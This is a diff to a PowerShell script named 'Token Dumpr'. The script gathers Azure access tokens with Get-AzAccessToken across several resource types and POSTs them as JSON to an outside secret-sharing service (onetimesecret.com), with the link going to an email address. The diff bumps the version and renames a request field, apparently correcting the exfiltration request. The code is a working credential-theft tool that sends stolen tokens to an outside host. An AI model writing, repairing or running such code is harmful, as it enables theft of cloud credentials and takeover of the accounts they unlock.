@@ -8,7 +8,7 @@ function AccessToken {
     try {
         $tokens = @()
 
-        Write-Host "--- Token Dumpr v1.0.0 ---"
+        Write-Host "--- Token Dumpr v1.0.1 ---"
         foreach ($resourceTypeName in $resourceTypeNames) {
             try {
                 $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName)
@@ -28,9 +28,9 @@ function AccessToken {
             Uri    = 'https://us.onetimesecret.com/api/v1/share'
             Method = 'POST'
             Body   = @{
-                secret  = $tokens | ConvertTo-Json -Depth 10
-                ttl     = 3600
-                receipt = $($receiptEmail)
+                secret    = $tokens | ConvertTo-Json -Depth 10
+                ttl       = 3600
+                recipient = $($receiptEmail)
             }
         }
     
